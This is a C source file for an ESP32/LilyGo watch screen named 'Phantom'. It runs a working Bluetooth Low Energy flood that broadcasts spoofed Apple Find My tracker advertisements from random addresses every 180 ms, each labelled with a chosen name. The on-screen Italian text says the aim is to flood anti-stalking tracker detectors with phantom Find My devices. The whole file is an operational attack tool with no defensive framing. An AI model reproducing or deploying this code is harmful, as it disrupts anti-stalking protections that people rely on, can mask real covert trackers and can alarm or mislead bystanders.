#include "phantom_flood_screen.h"
#include <LilyGoLib.h>
#include "ble_scan_manager.h"
#include <string.h>
#include <stdio.h>
#include "esp_gap_ble_api.h"
#include "esp_system.h"   // esp_random

void tools_screen_show();

static lv_obj_t *s_scr, *count_label, *btn, *btn_lbl, *name_ta, *keyboard;
static bool s_pending_stack = false;
static bool s_flooding = false;
static bool s_have_stack = false;
static uint32_t s_sent = 0;
static uint32_t s_last_ms = 0;
static char s_name[20] = "CALMATI";
static bool s_custom = false;          // user typed a custom base name → use it for all

// The comedic CALMATI cycle — each phantom picks the next one round-robin.
static const char *VARIANTS[] = {
    "CALMATI", "CLMT", "CALMATE", "HODETTOCALMATI", "CALMATIII", "STAICALMO",
    "CALMA", "CALMATIDAI", "OHCALMATI", "MACALMATI", "CALMATIVI", "CALMATIRAGA"
};
#define VAR_N (int)(sizeof(VARIANTS)/sizeof(VARIANTS[0]))

// One flood step: random static-random address + advert carrying the chosen
// Complete Local Name (0x09) + a compact Apple Find My manufacturer blob. So
// every phantom shows up NAMED (e.g. an endless army of "CALMATI") on scanners.
static void flood_step()
{
    esp_ble_gap_stop_advertising();

    esp_bd_addr_t a;
    for (int i = 0; i < 6; i++) a[i] = (uint8_t)esp_random();
    a[0] |= 0xC0;
    esp_ble_gap_set_rand_addr(a);

    // Custom base name (if the user typed one) else cycle the CALMATI variants.
    const char *name = s_custom ? s_name : VARIANTS[s_sent % VAR_N];
    int nl = (int)strlen(name);
    if (nl > 18) nl = 18;
    if (nl == 0) { name = "CALMATI"; nl = 7; }

    uint8_t raw[31]; int p = 0;
    // Complete Local Name AD
    raw[p++] = (uint8_t)(nl + 1);
    raw[p++] = 0x09;
    memcpy(raw + p, name, nl); p += nl;
    // Apple Find My manufacturer AD, sized to fill the rest of the 31-byte budget
    int room = 31 - p;                 // bytes left for the manufacturer AD
    if (room >= 6) {                   // need [len][0xFF][4C 00 12 xx ...]
        int mplen = room - 1;          // manufacturer payload length (after 0xFF)
        raw[p++] = (uint8_t)mplen;
        raw[p++] = 0xFF;
        raw[p++] = 0x4C; raw[p++] = 0x00; raw[p++] = 0x12;
        raw[p++] = (uint8_t)(mplen - 3);           // find-my payload length
        for (int i = p; i < 31 && p < 31; i++) raw[p++] = (uint8_t)esp_random();
    }
    esp_ble_gap_config_adv_data_raw(raw, p);

    esp_ble_adv_params_t ap = {};
    ap.adv_int_min = 0x30; ap.adv_int_max = 0x30;
    ap.adv_type = ADV_TYPE_NONCONN_IND;
    ap.own_addr_type = BLE_ADDR_TYPE_RANDOM;
    ap.channel_map = ADV_CHNL_ALL;
    ap.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY;
    esp_ble_gap_start_advertising(&ap);
    s_sent++;
}

static void set_btn(bool on)
{
    lv_label_set_text(btn_lbl, on ? "STOP" : "START");
    lv_obj_set_style_bg_color(btn, on ? lv_color_make(0x99,0x22,0x22)
                                      : lv_color_make(0x88,0x22,0x88), LV_PART_MAIN);
}

static void sync_name()
{
    const char *t = lv_textarea_get_text(name_ta);
    if (t) { strncpy(s_name, t, sizeof(s_name) - 1); s_name[sizeof(s_name) - 1] = '\0'; }
    // Empty or the default "CALMATI" → cycle the variant carousel; otherwise the
    // user picked a custom base name → use it for every phantom.
    s_custom = (s_name[0] != '\0' && strcmp(s_name, "CALMATI") != 0);
}

static void on_btn(lv_event_t *)
{
    if (!s_have_stack) return;
    sync_name();
    s_flooding = !s_flooding;
    if (!s_flooding) esp_ble_gap_stop_advertising();
    set_btn(s_flooding);
}

static void on_ta_event(lv_event_t *e)
{
    lv_event_code_t c = lv_event_get_code(e);
    if (c == LV_EVENT_FOCUSED)   lv_obj_clear_flag(keyboard, LV_OBJ_FLAG_HIDDEN);
    else if (c == LV_EVENT_DEFOCUSED || c == LV_EVENT_READY) {
        lv_obj_add_flag(keyboard, LV_OBJ_FLAG_HIDDEN);
        sync_name();
    }
}

static void on_refresh(lv_timer_t *)
{
    if (lv_scr_act() != s_scr) return;
    if (s_pending_stack) { s_pending_stack = false; s_have_stack = ble_stack_acquire(); }
    if (s_flooding && s_have_stack && millis() - s_last_ms >= 180) {
        s_last_ms = millis();
        flood_step();
    }
    lv_label_set_text_fmt(count_label, s_flooding ? "FLOOD attivo - %lu inviati"
                                                  : "%lu phantom inviati",
                          (unsigned long)s_sent);
}

void phantom_flood_screen_stop()
{
    s_flooding = false;
    esp_ble_gap_stop_advertising();
    if (s_have_stack) { ble_stack_release(); s_have_stack = false; }
}

static void on_gesture(lv_event_t *e)
{
    if (lv_indev_get_gesture_dir(lv_event_get_indev(e)) == LV_DIR_TOP) {
        phantom_flood_screen_stop();
        tools_screen_show();
    }
}

void phantom_flood_screen_create()
{
    s_scr = lv_obj_create(NULL);
    lv_obj_set_style_bg_color(s_scr, lv_color_black(), LV_PART_MAIN);
    lv_obj_set_style_border_width(s_scr, 0, LV_PART_MAIN);
    lv_obj_clear_flag(s_scr, LV_OBJ_FLAG_SCROLLABLE);

    lv_obj_t *title = lv_label_create(s_scr);
    lv_obj_set_style_text_color(title, lv_color_make(0xff,0x66,0xcc), LV_PART_MAIN);
    lv_obj_set_style_text_font(title, &lv_font_montserrat_40, LV_PART_MAIN);
    lv_label_set_text(title, "Phantom");
    lv_obj_align(title, LV_ALIGN_TOP_MID, 0, 24);

    lv_obj_t *sub = lv_label_create(s_scr);
    lv_obj_set_style_text_font(sub, &lv_font_montserrat_14, LV_PART_MAIN);
    lv_obj_set_style_text_color(sub, lv_color_make(0x99,0x66,0x88), LV_PART_MAIN);
    lv_obj_set_style_text_align(sub, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
    lv_obj_set_width(sub, 380);
    lv_label_set_text(sub, "inonda i radar anti-stalking di\nFindMy fantasma - col nome che scegli");
    lv_obj_align(sub, LV_ALIGN_TOP_MID, 0, 78);

    lv_obj_t *nm_lbl = lv_label_create(s_scr);
    lv_obj_set_style_text_font(nm_lbl, &lv_font_montserrat_16, LV_PART_MAIN);
    lv_obj_set_style_text_color(nm_lbl, lv_color_make(0xaa,0xaa,0xaa), LV_PART_MAIN);
    lv_label_set_text(nm_lbl, "Nome:");
    lv_obj_align(nm_lbl, LV_ALIGN_TOP_MID, -120, 130);

    name_ta = lv_textarea_create(s_scr);
    lv_textarea_set_one_line(name_ta, true);
    lv_textarea_set_max_length(name_ta, 18);
    lv_textarea_set_text(name_ta, s_name);
    lv_obj_set_width(name_ta, 240);
    lv_obj_align(name_ta, LV_ALIGN_TOP_MID, 30, 122);
    lv_obj_add_event_cb(name_ta, on_ta_event, LV_EVENT_ALL, NULL);

    count_label = lv_label_create(s_scr);
    lv_obj_set_style_text_font(count_label, &lv_font_montserrat_20, LV_PART_MAIN);
    lv_obj_set_style_text_color(count_label, lv_color_make(0xff,0xaa,0xdd), LV_PART_MAIN);
    lv_label_set_text(count_label, "0 phantom inviati");
    lv_obj_align(count_label, LV_ALIGN_CENTER, 0, 40);

    btn = lv_obj_create(s_scr);
    lv_obj_set_size(btn, 260, 68);
    lv_obj_align(btn, LV_ALIGN_BOTTOM_MID, 0, -30);
    lv_obj_set_style_radius(btn, 12, LV_PART_MAIN);
    lv_obj_set_style_bg_color(btn, lv_color_make(0x88,0x22,0x88), LV_PART_MAIN);
    lv_obj_set_style_bg_opa(btn, LV_OPA_COVER, LV_PART_MAIN);
    lv_obj_set_style_border_width(btn, 0, LV_PART_MAIN);
    lv_obj_clear_flag(btn, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_add_flag(btn, LV_OBJ_FLAG_CLICKABLE);
    lv_obj_add_event_cb(btn, on_btn, LV_EVENT_CLICKED, NULL);
    btn_lbl = lv_label_create(btn);
    lv_obj_set_style_text_color(btn_lbl, lv_color_white(), LV_PART_MAIN);
    lv_obj_set_style_text_font(btn_lbl, &lv_font_montserrat_28, LV_PART_MAIN);
    lv_label_set_text(btn_lbl, "START");
    lv_obj_center(btn_lbl);

    keyboard = lv_keyboard_create(s_scr);
    lv_keyboard_set_textarea(keyboard, name_ta);
    lv_obj_add_flag(keyboard, LV_OBJ_FLAG_HIDDEN);

    lv_obj_add_event_cb(s_scr, on_gesture, LV_EVENT_GESTURE, NULL);
    lv_timer_create(on_refresh, 60, NULL);
}

void phantom_flood_screen_show()
{
    s_flooding = false; s_sent = 0; s_last_ms = 0;
    set_btn(false);
    lv_obj_add_flag(keyboard, LV_OBJ_FLAG_HIDDEN);
    lv_scr_load(s_scr);
    s_pending_stack = true;
}

bool phantom_flood_screen_is_active() { return lv_scr_act() == s_scr; }
